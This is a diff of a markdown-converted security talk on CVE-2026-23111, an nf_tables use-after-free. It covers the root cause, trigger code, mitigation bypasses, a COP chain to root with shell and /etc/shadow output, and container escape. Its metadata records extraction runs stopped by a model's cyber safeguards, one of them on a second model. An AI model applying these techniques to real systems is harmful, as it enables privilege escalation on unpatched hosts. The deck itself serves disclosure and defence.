@@ -14,6 +14,10 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 91.7
 ocr_unreliable_blocks: 0
+vision_unreviewed_pages: "34-73"
+content_note: "PARTIAL REVIEW. Pages 1-33 were rendered and read against the source PDF by a vision model and are applied here. PAGES 34-73 WERE NOT REVIEWED: two runs were stopped by the model API's cyber safeguards, the first on Opus before any page was read, the second on Sonnet after page 33. Those 40 pages keep their first-pass extraction and are not verified. See markdown/VERIFICATION.md."
+vision_verified_pages_changed: 28
+vision_verified_pages: 33
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -153,9 +157,9 @@ Information Classification: General
 
 ## Slide 4
 
-One inverted boolean in nf_tables
+##### **AGENDA**
 
-###### **AGENDA**
+One inverted boolean in nf_tables
 
 A deterministic use-after-free
 
@@ -163,13 +167,21 @@ A deterministic use-after-free
 
 Root cause analysis of the inverted genmask check
 
-Part II:  Exploitation From UAF to root on hardened Ubuntu 24.04
+Part II:  Exploitation
 
-Part III:  Container Escape Escaping AKS and GKE managed Kubernetes
+From UAF to root on hardened Ubuntu 24.04
 
-Part IV:  Disclosure Three vendors, three reasons, same result
+Part III:  Container Escape
 
-Closing:  Lessons Learned What the industry should fix
+Escaping AKS and GKE managed Kubernetes
+
+Part IV:  Disclosure
+
+Three vendors, three reasons, same result
+
+Closing:  Lessons Learned
+
+What the industry should fix
 
 Information Classification: General
 
@@ -177,12 +189,21 @@ Information Classification: General
 
 ##### **OVERVIEW: DIFF & CVE**
 
-static void nft_map_catchall_activate(const struct nft_ctx *ctx, struct nft_set *set) { list_for_each_entry(catchall, &set->catchall_list, list) { ext = nft_set_elem_ext(set, catchall->elem); **-        if (!nft_set_elem_active(ext, genmask)) +        if (nft_set_elem_active(ext, genmask))** continue;
+```
+static void nft_map_catchall_activate(const struct nft_ctx *ctx,
+                                       struct nft_set *set)
+ {
+     list_for_each_entry(catchall, &set->catchall_list, list) {
+         ext = nft_set_elem_ext(set, catchall->elem);
+-        if (!nft_set_elem_active(ext, genmask))
++        if (nft_set_elem_active(ext, genmask))
+             continue;
+```
 
-commit f41c5d151078 -- Feb 4, 2026 net/netfilter/nf_tables_api.c
+commit f41c5d151078 -- Feb 4, 2026
+net/netfilter/nf_tables_api.c
 
 -> author: Andrew Fasano on 2026-02-04 17:46:58 +0100
-
 -> committer: Florian Westphal on 2026-02-05 08:36:59 +0100
 
 **-> Assigned: CVE-2026-23111**
@@ -195,9 +216,27 @@ Information Classification: General
 
 **<u>CVE-2026-23111 Impact:</u>**
 
-**Ubuntu** 24.04 LTS (Desktop + Server) **EXPLOITED AKS** (Azure Kubernetes Service) **EXPLOITED GKE** Standard (Google Kubernetes Engine) **EXPLOITED** EKS (Amazon Elastic Kubernetes Service) **NOT TESTED** Any Kubernetes on Ubuntu 24.04 nodes **VIABLE**
+| | |
+|---|---|
+| **Ubuntu** 24.04 LTS (Desktop + Server) | **EXPLOITED** |
+| **AKS** (Azure Kubernetes Service) | **EXPLOITED** |
+| **GKE** Standard (Google Kubernetes Engine) | **EXPLOITED** |
+| EKS (Amazon Elastic Kubernetes Service) | NOT TESTED |
+| Any Kubernetes on Ubuntu 24.04 nodes | VIABLE |
 
-<u>NOTE:</u> Also other mainstream distros were impacted. Introduced:  Linux 6.4, commit 628bd3e49cba (Jun 16, 2023) Fixed:       commit f41c5d151078 (Feb 4, 2026) Duration:    2 years, 7 months, 19 days **<u>Patching status (as of today):</u>** Ubuntu backport: **PATCHED** Azure kernel fix: **PATCHED** GKE kernel fix: **PATCHED**
+<u>NOTE:</u> Also other mainstream distros were impacted.
+
+Introduced:  Linux 6.4, commit 628bd3e49cba (Jun 16, 2023)
+Fixed:       commit f41c5d151078 (Feb 4, 2026)
+Duration:    2 years, 7 months, 19 days
+
+**<u>Patching status (as of today):</u>**
+
+| | |
+|---|---|
+| Ubuntu backport: | **PATCHED** |
+| Azure kernel fix: | **PATCHED** |
+| GKE kernel fix: | **PATCHED** |
 
 Information Classification: General
 
@@ -223,39 +262,27 @@ Information Classification: General
 
 Information Classification: General
 
+**User Space:**
+Attacker Process (`unshare -Urn`) —[`CAP_NET_ADMIN`]→ Netlink Socket (`NETLINK_NETFILTER`)
 
-> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+↓ *syscall*
 
-```text
-WHAT IS nf_tables?
-Attacker Process CAP_NET_ADMIN Netlink Socket
-unshare -Urn NETLINK NETFILTER
-syscall
-nfnetlink (dispatch)
-nf_tables
-transaction engine + object management
-Tables Transactions Expressions
-chains, sets, rules batch commit/abort verdict, dynset, .
-Netfilter Hooks (packet path)
-INPUT / OUTPUT / FORWARD / PREROUTING / POSTROUTING
+**Kernel Space:**
+`nfnetlink` (dispatch) → **nf_tables** — transaction engine + object management
+
+- Tables — chains, sets, rules
+- Transactions — batch commit/abort
+- Expressions — verdict, dynset, ...
+
+Netfilter Hooks (packet path): INPUT / OUTPUT / FORWARD / PREROUTING / POSTROUTING
 Docker, Kubernetes, iptables-nft, firewalld — every container uses this
-Key Facts
-Default on Ubuntu, Debian,
-Fedora, RHEL, SUSE, Arch
-Reachable from unprivileged
-user namespaces
-Prior CVEs in nf_tables
-CVE-2024-1086 (UAF)
-CVE-2024-0193 (UAF )
-CVE-2026-23111 (this)
-Attack Path
-unshare(CLONE NEWUSER)
-|
-CAP_NET ADMIN (in ns)
-Full nf_tables access
-|
-Trigger UAF — ROOT
-```
+
+**Key Facts**
+- Default on Ubuntu, Debian, Fedora, RHEL, SUSE, Arch
+- Reachable from unprivileged user namespaces
+- Prior CVEs in nf_tables: CVE-2022-32250 (UAF), CVE-2024-1086 (UAF), CVE-2024-0193 (UAF), CVE-2026-23111 (this)
+
+**Attack Path:** `unshare(CLONE_NEWUSER)` → `CAP_NET_ADMIN (in ns)` → `Full nf_tables access` → **Trigger UAF → ROOT**
 
 ## Slide 9
 
@@ -263,64 +290,54 @@ Trigger UAF — ROOT
 
 Information Classification: General
 
+**Ubuntu 24.04 LTS – Mitigation Stack**
+*6.8.0-41-generic, all mitigations enabled*
 
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Mitigation | Description | Result |
+|---|---|---|
+| KASLR ✗ | Randomized kernel base address — Can't hardcode target addresses | LEAKED |
+| SMAP / SMEP ✗ | No user-space memory access from kernel — Blocks ret2user techniques | IRRELEVANT |
+| RETHUNK ✗ | Every ret replaced with safe return thunk — Classical ROP is constrained | COP (no ret) |
+| RANDOM_KMALLOC_CACHES ✗ | 16 random sub-caches per slab size — Heap feng shui is dead | PAGE PIN |
+| AppArmor ✗ | Unprivileged user namespace creation restricted — Blocks unshare/clone with CLONE_NEWUSER | BUSYBOX |
+| Stack Canaries ✗ | Stack buffer overflow protection — Random canary value checked on return | NO STACK |
 
-```text
-THE TARGET STACK
-Ubuntu 24.04 LTS - Mitigation Stack
-RQ
-6.8.0-41-generic, all mitigations enabled
-Randomized kernel base address
-x ; LEAKED
-Can't hardcode target addresses
-x No user-space memory access from kernel
-SMAP / SMEP IRRELEVANT
-Blocks ret2user techniques
-Every ret replaced with safe return thunk
-RETHUNK X COP (no ret)
-Classical ROP is constrained
-16 random sub-caches per slab size
-RANDOM_KMALLOC_CACHES X¥ PAGE PIN
-Heap feng shui is dead
-Unprivileged user namespace creation restricted
-AppArmor x BUSYBOX
-Blocks unshare/clone with CLONE_NEWUSER
-Stack buffer overflow protection
-Stack Canaries x NO STACK
-Random canary value checked on return
-All are irrelevant or bypassed. No mitigation survived.
-```
+**All are irrelevant or bypassed. No mitigation survived.**
 
 ## Slide 10
 
-user@ubuntu:~$ busybox unshare -Urn ./exploit --no-ns [*] CVE-2026-23111 -- nf_tables catchall UAF
-
+```
+user@ubuntu:~$ busybox unshare -Urn ./exploit --no-ns
+[*] CVE-2026-23111 -- nf_tables catchall UAF
 [*] Target: 6.8.0-41-generic (Ubuntu 24.04 LTS)
-
 [*] Stage 1: Trigger -- draining chain->use...
-
 [+] chain->use == 0, DELCHAIN succeeded
-
 [*] Stage 2: KASLR leak...
-
 [+] module_base = 0xffffffffc0635000
-
 [+] vmlinux_base = 0xffffffffba200000
-
 [*] Stage 3: Heap spray -- COP payload...
-
 [+] COP payload at 0xffff888005a3c080
-
 [*] Stage 4: Triggering code execution...
-
-[+] ======================================== [+] GOT ROOT! uid=0 euid=0 [+] ======================================== root@ubuntu:~# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~# cat /etc/shadow | head -1 root:$6$...:19839:0:99999:7:::
+[+] ========================================
+[+] GOT ROOT! uid=0 euid=0
+[+] ========================================
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# cat /etc/shadow | head -1
+root:$6$...:19839:0:99999:7:::
+```
 
 Information Classification: General
 
 ## Slide 11
 
-And then the same primitive escalates to container escape. **Azure Kubernetes Service pod$ → node# Google Kubernetes Engine pod$ → node#**
+And then the same primitive escalates to container escape.
+
+**Azure Kubernetes Service**
+**pod$ → node#**
+
+**Google Kubernetes Engine**
+**pod$ → node#**
 
 **Default pods. No capabilities. No privileges.**
 
@@ -332,43 +349,36 @@ Information Classification: General
 
 Information Classification: General
 
+**nf_tables Object Model**
+Table → Chain → Set (verdict map with catchall element)
 
-> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+`nft_table "t1"` (family = NFPROTO_INET)
 
-```text
-nf_tables Object Model
-nf_tables OBJECT MODEL
-Table — Chain — Set (verdict map with catchall element)
-nft_table eit (family =
-nft_chain
-name = "victim"
-blob gen 0 = rule blob
-table = &tl | handle =
-GOTO verdict — chain->use++
-This is the ONLY reference
-keeping chain->use = 1
-NFPROTO_INET)
-2
-nft_set
-name = "s1" (verdict map)
-dtype = NFT DATA VERDICT
-catchall element
-verdict = GOTO
-binding: chain="victim"
-Normal enforcement: DELCHAIN fails with EBUSY if use > 0
-The bug: abort path drains use to O WITHOUT removing the GOTO reference
-Why it is exploitable:
-1. Catchall matches
-every packet . GOTO
-2. GOTO increments
-chain->use to 1
-3. Abort DRAINS
-use back to 0
-4. DELCHAIN succeeds
-(use==0 passes check)
-USE-AFTER-FREE
-Deterministic, no race
-```
+- **nft_chain** — `name = "victim"`
+  - `use = 1`
+  - `blob_gen_0 → rule_blob`
+  - `table = &t1  |  handle = 2`
+  - **GOTO verdict → chain->use++** — This is the ONLY reference keeping chain->use = 1
+
+- **nft_set** — `name = "s1"` (verdict map)
+  - `dtype = NFT_DATA_VERDICT`
+  - **catchall element** — `verdict = GOTO`
+    - `!set_elem_active→BUG`
+  - `binding: chain="victim"`
+
+A red **GOTO** arrow connects the catchall element's verdict to the chain's `use` counter.
+
+**Normal enforcement:** DELCHAIN fails with EBUSY if use > 0
+**The bug:** abort path drains use to 0 WITHOUT removing the GOTO reference
+
+**Why it is exploitable:**
+1. Catchall matches every packet → GOTO
+2. GOTO increments chain->use to 1
+3. **Abort DRAINS** use back to 0
+4. **DELCHAIN succeeds** (use==0 passes check)
+5. **Chain FREED** — Catchall still holds GOTO → freed memory
+
+**USE-AFTER-FREE** — Deterministic, no race
 
 ## Slide 13
 
@@ -376,30 +386,62 @@ Deterministic, no race
 
 Information Classification: General
 
-
-> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-THE TRANSACTION MODEL
-nf_tables Transaction Model
+**nf_tables Transaction Model**
 Batch processing: prepare ALL ops, then commit or abort
-Userspace netlink batch:
-BEGIN opi: DELSET | [ op2: NEWCHAIN |
-Y
+
+Userspace netlink batch: `BEGIN` | `op1: DELSET` | `op2: NEWCHAIN` | `op3: ...` | `END`
+
 Kernel processes ALL ops (even after error):
-> record on commit_list
-op2: NEWCHAIN x EEXIST (duplicate name) +> BATCH_FAILURE
+- `op1: DELSET` — prepare succeeds → record on commit_list
+- `op2: NEWCHAIN` — EEXIST (duplicate name) → BATCH_FAILURE
+
 Key: op1's prepare-phase side effects ALREADY HAPPENED before op2 fails
-{ All ops succeeded?
-nf_tables_commit() __nf_tables_abort()
-The abort path calls nft_map_catchall_activate() — which has the inverted check.
-```
+
+All ops succeeded? — **YES** → `nf_tables_commit()` (changes go live) · **NO** → `__nf_tables_abort()` (rollback ALL — but buggy)
+
+**The abort path calls `nft_map_catchall_activate()` — which has the inverted check.**
 
 ## Slide 14
 
 ##### **DEACTIVATE AND ACTIVATE: THE SYMMETRY**
 
-**DEACTIVATE (CORRECT) ACTIVATE (BUG!)** nft_map_catchall_deactivate() nft_map_catchall_activate() { { list_for_each_entry(catchall, ...) { list_for_each_entry(catchall, ...) { ext = nft_set_elem_ext(...); ext = nft_set_elem_ext(...); if (!nft_set_elem_active(ext, if ( **!** nft_set_elem_active(ext, genmask)) genmask)) continue; continue; **<-- SAME!** nft_set_elem_change_active(...); nft_clear(ctx->net, ext); nft_setelem_data_deactivate(...); nft_setelem_data_activate(...); // chain->use-// chain->use++ } } } } Both use **if (!active) continue** — skips inactive elements.
+**DEACTIVATE (CORRECT)**
+```
+nft_map_catchall_deactivate()
+{
+  list_for_each_entry(catchall, ...) {
+    ext = nft_set_elem_ext(...);
+    if (!nft_set_elem_active(ext,
+         genmask))
+      continue;
+
+    nft_set_elem_change_active(...);
+    nft_setelem_data_deactivate(...);
+              // chain->use--
+  }
+}
+```
+
+**ACTIVATE (BUG!)**
+```
+nft_map_catchall_activate()
+{
+list_for_each_entry(catchall, ...) {
+  ext = nft_set_elem_ext(...);
+  if (!nft_set_elem_active(ext,
+       genmask))
+    continue;            <-- SAME!
+
+    nft_clear(ctx->net, ext);
+    nft_setelem_data_activate(...);
+              // chain->use++
+  }
+}
+```
+
+(On the slide, the `!` in DEACTIVATE's condition is highlighted green; the same `!` in ACTIVATE's condition — textually identical — is highlighted red as the point of failure.)
+
+Both use **if (!active) continue** — skips inactive elements.
 
 **Deactivate: correct (process active ones to deactivate them).**
 
@@ -411,21 +453,23 @@ Information Classification: General
 
 ##### **THE LOGIC EXPLAINED**
 
-**nft_set_elem_active(ext, genmask):**
+```
+nft_set_elem_active(ext, genmask):
+    returns !(ext->genmask & genmask)
 
-returns !(ext->genmask & genmask)
+    genmask bit CLEAR  -->  element is ACTIVE    -->  returns true
+    genmask bit SET    -->  element is INACTIVE  -->  returns false
 
-genmask bit CLEAR  -->  element is **ACTIVE -->  returns true** genmask bit SET    -->  element is **INACTIVE -->  returns false**
+In deactivate (CORRECT):
+    if (!active) continue;     <--  skip inactive, process active  OK
 
-**In deactivate (CORRECT):** if (!active) continue;     <--  skip inactive, process active  OK
+In activate (BUGGY):
+    if (!active) continue;     <--  skip inactive, process active  WRONG
+                                should process inactive!
 
-**In activate (BUGGY):**
-
-if (!active) continue;     <--  skip inactive, process active  WRONG should process inactive!
-
-###### **FIXED:**
-
-if (active) continue;      <--  skip active, process inactive  OK
+FIXED:
+    if (active) continue;      <--  skip active, process inactive  OK
+```
 
 Information Classification: General
 
@@ -435,41 +479,42 @@ Information Classification: General
 
 Information Classification: General
 
+**STATE 1: Initial Setup**
+`chain "victim"` (`use = 1`) —[GOTO]→ `catchall element` (`genmask = 0`, ACTIVE)
 
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+↓ *DELSET prepare phase*
 
-```text
-THE REFCOUNT DRAIN
-STATE 1: Initial Setup
-chain "victim" catchall element
-use = genmask = 0
-STATE 2: After Prepare (deactivate ran)
-chain "victim" catchall element
-use = 0 genmask = 1 (INACTIVE)
-TE 3: After Abort — BUG!
-chain "victim" catchall element
-use = 0 (NOT RESTORED) genmask = 1 (INACTIVE)
-activate: if (!active) continue; + element is INACTIVE + SKIPPED
-chain->use NOT restored. The one-char bug.
-DELCHAIN "victim"
-STATE 4: Chain Freed — USE-AFTER-FREE
-DANGLING PTR catchall element
-FREED
-still holds GOTO + ???
-kfrée( chain)
-DELCHAIN succeeds (use == 0). Chain memory released.
-Catchall still holds GOTO pointer to freed memory — USE-AFTER-FREE
-```
+**STATE 2: After Prepare (deactivate ran)**
+`chain "victim"` (`use = 0`) —[GOTO]→ `catchall element` (`genmask = 1`, INACTIVE)
+`chain->use-- ✓`     `change_active: genmask ^= 1`
+
+↓ *Batch ABORTS (intentional error in op2)*
+
+**STATE 3: After Abort — BUG!**
+`chain "victim"` (`use = 0`, NOT RESTORED) —[GOTO]→ `catchall element` (`genmask = 1`, INACTIVE)
+`activate: if (!active) continue;` → element is INACTIVE → SKIPPED
+**chain->use NOT restored. The one-char bug.**
+
+↓ *DELCHAIN "victim"*
+
+**STATE 4: Chain Freed — USE-AFTER-FREE**
+`FREED` (`kfree(chain)`) --[DANGLING PTR]--> `catchall element` (`still holds GOTO → ???`)
+**DELCHAIN succeeds (use == 0). Chain memory released.**
+**Catchall still holds GOTO pointer to freed memory → USE-AFTER-FREE**
 
 ## Slide 17
 
 ##### **A DETERMINISTIC UAF**
 
-#### **No race condition. No timing window. No probability.**
+#### **No race condition.**
+#### **No timing window.**
+#### **No probability.**
 
 ###### **Compare:**
 
-CVE-2022-32250: required heap spray timing CVE-2024-1086: required page-level race CVE-2026-23111: a counted loop
+CVE-2022-32250: required heap spray timing
+CVE-2024-1086: required page-level race
+CVE-2026-23111: a counted loop
 
 #### **The trigger is 100% deterministic.**
 
@@ -479,7 +524,30 @@ Information Classification: General
 
 ##### **THE TRIGGER CODE**
 
-**// Setup: table + chain + verdict map with catchall -> GOTO victim** create_table("t1"); create_chain("t1", "victim"); create_chain("t1", "base"); create_map_with_catchall("t1", "m1", "victim");   // chain->use = 1 **// Trigger: DELSET + intentional error -> forced abort** batch_begin(); build_DELSET("m1");             // prepare: deactivates catchall //          chain->use-- -> 0 build_NEWCHAIN("base",          // EEXIST -> forces batch abort NLM_F_CREATE | NLM_F_EXCL); batch_end(); batch_send(); **// abort: activate SKIPS inactive element. use stays 0. // Free the chain** batch_begin(); build_DELCHAIN("victim");       // succeeds: use == 0 batch_end(); batch_send_commit(); **// chain struct is kfree'd. UAF achieved.**
+```
+// Setup: table + chain + verdict map with catchall -> GOTO victim
+create_table("t1");
+create_chain("t1", "victim");
+create_chain("t1", "base");
+create_map_with_catchall("t1", "m1", "victim");   // chain->use = 1
+
+// Trigger: DELSET + intentional error -> forced abort
+batch_begin();
+    build_DELSET("m1");             // prepare: deactivates catchall
+                                     //          chain->use-- -> 0
+    build_NEWCHAIN("base",          // EEXIST -> forces batch abort
+                    NLM_F_CREATE | NLM_F_EXCL);
+batch_end();
+batch_send();
+// abort: activate SKIPS inactive element. use stays 0.
+
+// Free the chain
+batch_begin();
+    build_DELCHAIN("victim");       // succeeds: use == 0
+batch_end();
+batch_send_commit();
+// chain struct is kfree'd. UAF achieved.
+```
 
 Information Classification: General
 
@@ -489,29 +557,27 @@ Information Classification: General
 
 Information Classification: General
 
+**struct nft_chain - Freed Object Layout**
+120 bytes in kmalloc-cg-128 — three exploitation primitives
 
-> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Offset | Field | Primitive |
+|---|---|---|
+| +0x00 | **blob_gen_0** — `struct nft_rule_blob *` | **CODE EXECUTION** — packet eval follows ptr |
+| +0x08 | blob_gen_1 (struct nft_rule_blob *) | |
+| +0x10 | rules (struct list_head) | |
+| +0x20 | list (struct list_head) | |
+| +0x30 | rhlhead (struct rhlist_head) | |
+| +0x40 | **table** — `struct nft_table *` | **INFO LEAK** — table ptr leaks heap addr |
+| +0x48 | handle (u64) | |
+| +0x50 | use (u32) = 0 | |
+| +0x58 | **name** — `char *` | **ARBITRARY READ** — GETSETELEM reads name |
+| +0x60 | udlen (u16) + udata (u8 *) | |
+| +0x70 | blob_next (struct nft_rule_blob *) | |
 
-```text
-WHAT WE CONTROL (THE FREED OBJECT)
-struct nft_chain - Freed Object Layout
-120 bytes in kma g — thre ploitatior mitives
-blob_gen_0 | CODE EXECUTION
-truct nft_rule_ blob * packet eval follows ptr
-blob gen 1 (struct nft_rule blob *)
-rhlhead (struct rhlist_head)
-table INFO LEAK
-ct nft_table * table ptr leaks heap addr
-handle (u64)
-use (u32) = 0
-name
-char *
-udlen (ul6) + udata (u8 *)
-blob next (struct nft_rule blob *)
-kmalloc-cg-128
+`kmalloc-cg-128`
+
 Three primitives from one freed struct: code exec, info leak, arbitrary read.
-Reclaim with controlled data — full exploitation chain
-```
+Reclaim with controlled data → full exploitation chain.
 
 ## Slide 20
 
@@ -519,25 +585,20 @@ Reclaim with controlled data — full exploitation chain
 
 Information Classification: General
 
+**Exploit Pipeline - From Bug to Code Execution**
 
-> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| 1. Setup | 2. Trigger | 3. Free | 4. Reclaim | 5. ROOT |
+|---|---|---|---|---|
+| `nft_table t1`<br>`chain "victim"`<br>`set + catchall` | Netlink batch:<br>`DELSET(s1)`<br>`NEWCHAIN(dup)`<br>→ forced abort | `DELCHAIN "victim"`<br>`use==0` → allowed!<br>`kfree(chain)` | Heap spray:<br>table userdata<br>248B COP payload | `TCP connect()`<br>`nft_do_chain`<br>→ COP chain<br>**commit_creds** |
+| `use = 1` | `use = 0` | 120B → kmalloc-cg-128 | Triple constraint buf | |
 
-```text
-THE UAF TIMELINE
-Exploit Pipeline - From Bug to Code Execution
-1. Setup 2. Trigger 3. Free 4. Reclaim 5. ROOT
-nft_table tl Netlink batch: DELCHAIN "victim" Heap spray: TCP connect()
-chain "victim" DELSET(s1) use==0 = allowed! table userdata nft_do_ chain
-set + catchall NEWCHAIN (dup) kf ree( chain) 248B COP payload + COP chain
-— forced abort
-Step-by-step breakdown:
-120B = kmalloc-cg-128 Triple constraint buf commit_creds
-chain->use = 1 (catchall element references chain via GOTO verdict)
-2 Abort cycle: use drained to 0 — activate() skips inactive element (the one-char bug)
-DELCHAIN succeeds (use==0). Chain memory released: 120 bytes in kmalloc-cg-128
-Heap spray: reclaim freed slot with 248-byte COP payload (table userdata, same sub-cache)
-Trigger: TCP connect() — nft_do_chain — fake blob_gen_O — COP — commit_creds(fake_cred)
-```
+**Step-by-step breakdown:**
+
+1. chain->use = 1 (catchall element references chain via GOTO verdict)
+2. Abort cycle: use drained to 0 — activate() skips inactive element (the one-char bug)
+3. DELCHAIN succeeds (use==0). Chain memory released: 120 bytes in kmalloc-cg-128
+4. Heap spray: reclaim freed slot with 248-byte COP payload (table userdata, same sub-cache)
+5. Trigger: TCP connect() → nft_do_chain → fake blob_gen_0 → COP → commit_creds(fake_cred)
 
 ## Slide 21
 
@@ -569,23 +630,31 @@ Information Classification: General
 
 ## Slide 22
 
-From UAF to Root on Ubuntu 24.04
+##### **AGENDA**
 
-###### **AGENDA**
+From UAF to Root on Ubuntu 24.04
 
 All default mitigations enabled
 
-Part I:  The Bug Root cause analysis of the inverted genmask check
+Part I:  The Bug
+
+Root cause analysis of the inverted genmask check
 
 ###### **►  Part II:  Exploitation**
 
 From UAF to root on hardened Ubuntu 24.04
 
-Part III:  Container Escape Escaping AKS and GKE managed Kubernetes
+Part III:  Container Escape
 
-Part IV:  Disclosure Three vendors, three reasons, same result
+Escaping AKS and GKE managed Kubernetes
 
-Closing:  Lessons Learned What the industry should fix
+Part IV:  Disclosure
+
+Three vendors, three reasons, same result
+
+Closing:  Lessons Learned
+
+What the industry should fix
 
 Information Classification: General
 
@@ -595,41 +664,45 @@ Information Classification: General
 
 Information Classification: General
 
+**Exploitation Roadmap - 5 Stages**
 
-> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| # | Stage | Detail | Command | Defeats |
+|---|---|---|---|---|
+| 1 | AppArmor Bypass | Get CAP_NET_ADMIN without root | `busybox unshare -Urn → unconfined profile` | AppArmor |
+| 2 | Dual KASLR Leak | Module base + vmlinux base (two independent address spaces) | `nft_last_ops spray → struct module.list.prev` | KASLR |
+| 3 | Heap Spray + RANDOM_KMALLOC_CACHES Bypass | Reclaim freed chain with COP payload (248 bytes) | `PIN_CHAIN_COUNT=200 pins slab page → same sub-cache` | RND_KMALLOC |
+| 4 | COP Chain (Call-Oriented Programming) | Forward-edge code reuse — no ret gadgets needed | `nft_dynset_eval → ops->update = commit_creds` | RETHUNK |
+| 5 | Stable Return + Post-Exploitation | Clean return to userspace with uid=0 | `NFT_BREAK → return 0 → fork() → execve("/bin/sh")` | result: ROOT |
 
-```text
-THE EXPLOITATION ROADMAP
-Exploitation Roadmap - 5 Stages
-AppArmor Bypass
-Get CAP_NET_ADMIN without root
-defeats:
-AppArmor
-Dual KASLR Leak
-defeats:
-Module base + vmlinux base (two independent address spaces)
-KASLR
-Heap Spray + RANDOM_KMALLOC_CACHES Bypass acne:
-Reclaim freed chain with COP payload (248 bytes) RND inihos
-COP Chain (Call-Oriented Programming) a
-Forward-edge code reuse — no ret gadgets needed RETHUNK
-nft_dynset_eval > ops->update = commit_creds
-Stable Return + Post-Exploitation
-Clean return to userspace with uid=0
-Each stage solves one constraint. No step is optional.
-```
+**Each stage solves one constraint. No step is optional.**
 
 ## Slide 24
 
 ##### **STAGE 1: THE APPARMOR PROBLEM**
 
-**Ubuntu 24.04:** kernel.apparmor_restrict_unprivileged_userns = 1
+**Ubuntu 24.04:**
+```
+kernel.apparmor_restrict_unprivileged_userns = 1
+```
 
-**Effect:** unshare(CLONE_NEWUSER | CLONE_NEWNET) -> EPERM No CAP_NET_ADMIN -> No nftables access
+**Effect:**
+```
+unshare(CLONE_NEWUSER | CLONE_NEWNET) -> EPERM
+No CAP_NET_ADMIN -> No nftables access
+```
 
 ================================================================
 
-**Qualys userns bypasses (March 2025):** aa-exec -p unconfined -- ./exploit **Status: PATCHED in 6.8.0-100** aa-exec now transitions to "unprivileged_userns" -> strips CAP_NET_ADMIN
+**Qualys userns bypasses (March 2025):**
+```
+aa-exec -p unconfined -- ./exploit
+```
+
+**Status: PATCHED in 6.8.0-100**
+```
+aa-exec now transitions to "unprivileged_userns"
+-> strips CAP_NET_ADMIN
+```
 
 Information Classification: General
 
@@ -639,23 +712,23 @@ Information Classification: General
 
 **/etc/apparmor.d/busybox**
 
+```
 profile busybox /usr/bin/busybox flags=(unconfined) {
-
-- # Named unconfined profile -- inherits all capabilities
-
-- # Does NOT trigger userns_create transition
-
+  # Named unconfined profile -- inherits all capabilities
+  # Does NOT trigger userns_create transition
 }
+```
 
-**user$ busybox unshare -Urn ./exploit --no-ns**
+**`user$ busybox unshare -Urn ./exploit --no-ns`**
 
-- [*] User namespace created ( **CAP_NET_ADMIN** acquired)
+```
+[*] User namespace created (CAP_NET_ADMIN acquired)
+[*] Network namespace created
+[*] nftables operations available
+```
 
-- [*] Network namespace created
-
-- [*] nftables operations available
-
-busybox-static: dependency of ubuntu-minimal (ALWAYS installed) restrict_unprivileged_unconfined: disabled until Ubuntu 25.04
+busybox-static: dependency of ubuntu-minimal (ALWAYS installed)
+restrict_unprivileged_unconfined: disabled until Ubuntu 25.04
 
 Information Classification: General
 
@@ -665,38 +738,43 @@ Information Classification: General
 
 Information Classification: General
 
+**KASLR: Two Independent Address Spaces**
+Both must be leaked independently. One leak is not enough.
 
-> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**Virtual Address Space** (top to bottom):
+- `0xffffffff...`
+- `vmlinux` — kernel text + data, ~32 MB region
+- unmapped gap
+- `modules` — nf_tables.ko, ~1.5 GB range
+- `0xffffffffc...`
+- **Randomized independently** per boot
 
-```text
-STAGE 2: THE KASLR PROBLEM
-KASLR: Two Independent Address Spaces
-Both must be leaked independently. One leak is not enough
-Virtual Address Space What each unlocks:
+**Leak 1: nf_tables Module Base**
+Target: victim3 name (kmalloc-cg-16)
 1. Free victim3 chain (UAF)
-vmlinux 2. Spray 2048 nft_last expressions nft_dynset_eval addr
-ops->update target
-1. Module base needed for:
-kernel text + data 3. Reclaim name buf with nft_last_ops ptr
-~ COP dispatch
-2. vmlinux base needed for:
-Leak 2: vmlinux Kernel Base commit_creds addr
-init_cred addr
-Target: victim4 name (kmalloc-cg-256) init_user_ns addr
-1. Overwrite victim4.name pointer ~ fake cred payload
+2. Spray 2048 nft_last expressions
+3. Reclaim name buf with nft_last_ops ptr
+4. Read via GETSETELEM
+`module_base = addr - 0x54980`
+
+**Leak 2: vmlinux Kernel Base**
+Target: victim4 name (kmalloc-cg-256)
+1. Overwrite victim4.name pointer
 2. Point to struct module (from Leak 1)
-3. Read module.list.prev via GETSETELEM Both together:
-Oxffffffffc... 4. prev links back into vmlinux .data
-modules
-nf_tables.ko
-1.5 GB range
-COP chain dispatches
-Randomized independently vmlinux_base = prev - offset through module code to
-per boot Depends on Leak 1 (sequential) call vmlinux function
-Both KASLR bases defeated
+3. Read module.list.prev via GETSETELEM
+4. prev links back into vmlinux .data
+`vmlinux_base = prev - offset`
+Depends on Leak 1 (sequential)
+
+**What each unlocks:**
+1. Module base needed for: `nft_dynset_eval` addr, `ops->update` target, `set->ops` self-reference → COP dispatch
+2. vmlinux base needed for: `commit_creds` addr, `init_cred` addr, `init_user_ns` addr → fake cred payload
+3. Both together: COP chain dispatches through module code to call vmlinux function
+
+**Both KASLR bases defeated**
+
 Leak 1 feeds Leak 2: module base locates struct module, whose list.prev reveals vmlinux.
 Both leaks use the same dangling pointer read primitive, no new bugs needed.
-```
 
 ## Slide 27
 
@@ -704,31 +782,37 @@ Both leaks use the same dangling pointer read primitive, no new bugs needed.
 
 Information Classification: General
 
+**Dangling Pointer Read Chain**
